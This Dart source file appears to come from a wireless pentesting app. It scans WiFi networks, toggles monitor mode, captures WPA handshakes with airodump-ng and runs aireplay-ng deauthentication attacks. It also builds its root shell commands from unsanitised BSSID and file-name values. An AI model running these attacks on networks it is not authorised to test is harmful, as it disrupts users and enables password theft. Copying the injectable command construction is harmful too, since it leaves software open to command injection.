import '../core/shell_executor.dart';

class WiFiNetwork {
  final String ssid;
  final String bssid;
  final int channel;
  final int signal;
  final String security;
  final int quality;
  final String frequency;

  WiFiNetwork({
    required this.ssid,
    required this.bssid,
    required this.channel,
    required this.signal,
    required this.security,
    this.quality = 0,
    this.frequency = '',
  });
}

class WiFiScanner {
  final ShellExecutor _shell = ShellExecutor.instance;
  bool _isMonitorMode = false;
  String _originalMode = 'managed';

  Future<List<WiFiNetwork>> scanNetworks() async {
    final networks = <WiFiNetwork>[];

    try {
      // Use iwlist to scan for networks
      final result = await _shell.executeCommand(
        'iwlist wlan0 scan',
        requireRoot: true,
      );

      if (result.exitCode == 0) {
        final output = result.stdout.toString();
        final cells = output.split('Cell ');

        for (final cell in cells) {
          if (cell.trim().isEmpty) continue;

          final network = _parseNetworkCell(cell);
          if (network != null) {
            networks.add(network);
          }
        }
      } else {
        throw Exception('WiFi scan failed: ${result.stderr}');
      }
    } catch (e) {
      throw Exception('WiFi scanning error: $e');
    }

    return networks;
  }

  WiFiNetwork? _parseNetworkCell(String cell) {
    try {
      String ssid = '';
      String bssid = '';
      int channel = 0;
      int signal = 0;
      String security = 'Open';
      String frequency = '';

      // Extract BSSID
      final bssidMatch = RegExp(r'Address: ([0-9A-Fa-f:]{17})').firstMatch(cell);
      if (bssidMatch != null) {
        bssid = bssidMatch.group(1)!;
      }

      // Extract SSID
      final ssidMatch = RegExp(r'ESSID:"([^"]*)"').firstMatch(cell);
      if (ssidMatch != null) {
        ssid = ssidMatch.group(1)!;
      }

      // Extract Channel
      final channelMatch = RegExp(r'Channel:(\d+)').firstMatch(cell);
      if (channelMatch != null) {
        channel = int.parse(channelMatch.group(1)!);
      }

      // Extract Signal Level
      final signalMatch = RegExp(r'Signal level=(-?\d+)').firstMatch(cell);
      if (signalMatch != null) {
        signal = int.parse(signalMatch.group(1)!);
      }

      // Extract Frequency
      final freqMatch = RegExp(r'Frequency:([\d.]+) GHz').firstMatch(cell);
      if (freqMatch != null) {
        frequency = '${freqMatch.group(1)!} GHz';
      }

      // Determine Security
      if (cell.contains('WPA2')) {
        security = 'WPA2';
      } else if (cell.contains('WPA')) {
        security = 'WPA';
      } else if (cell.contains('WEP')) {
        security = 'WEP';
      }

      if (bssid.isNotEmpty) {
        return WiFiNetwork(
          ssid: ssid,
          bssid: bssid,
          channel: channel,
          signal: signal,
          security: security,
          frequency: frequency,
        );
      }
    } catch (e) {
      // Skip malformed entries
    }

    return null;
  }

  Future<void> enableMonitorMode() async {
    if (_isMonitorMode) return;

    try {
      // Get current mode
      final modeResult = await _shell.executeCommand('iwconfig wlan0');
      if (modeResult.exitCode == 0) {
        final output = modeResult.stdout.toString();
        if (output.contains('Mode:Managed')) {
          _originalMode = 'managed';
        }
      }

      // Bring interface down
      await _shell.executeCommand('ifconfig wlan0 down', requireRoot: true);

      // Set monitor mode
      await _shell.executeCommand('iwconfig wlan0 mode monitor', requireRoot: true);

      // Bring interface up
      await _shell.executeCommand('ifconfig wlan0 up', requireRoot: true);

      _isMonitorMode = true;
    } catch (e) {
      throw Exception('Failed to enable monitor mode: $e');
    }
  }

  Future<void> disableMonitorMode() async {
    if (!_isMonitorMode) return;

    try {
      // Bring interface down
      await _shell.executeCommand('ifconfig wlan0 down', requireRoot: true);

      // Set managed mode
      await _shell.executeCommand('iwconfig wlan0 mode managed', requireRoot: true);

      // Bring interface up
      await _shell.executeCommand('ifconfig wlan0 up', requireRoot: true);

      _isMonitorMode = false;
    } catch (e) {
      throw Exception('Failed to disable monitor mode: $e');
    }
  }

  Future<void> captureHandshake(String bssid, String outputFile) async {
    if (!_isMonitorMode) {
      throw Exception('Monitor mode must be enabled first');
    }

    try {
      // Start airodump-ng to capture handshake
      await _shell.executeCommand(
        'airodump-ng --bssid $bssid -w $outputFile wlan0 &',
        requireRoot: true,
      );
    } catch (e) {
      throw Exception('Failed to start handshake capture: $e');
    }
  }

  Future<void> deauthAttack(String bssid, {String? clientMac, int count = 10}) async {
    if (!_isMonitorMode) {
      throw Exception('Monitor mode must be enabled first');
    }

    try {
      String command = 'aireplay-ng --deauth $count -a $bssid';
      if (clientMac != null) {
        command += ' -c $clientMac';
      }
      command += ' wlan0';

      await _shell.executeCommand(command, requireRoot: true);
    } catch (e) {
      throw Exception('Deauth attack failed: $e');
    }
  }

  bool get isMonitorMode => _isMonitorMode;
}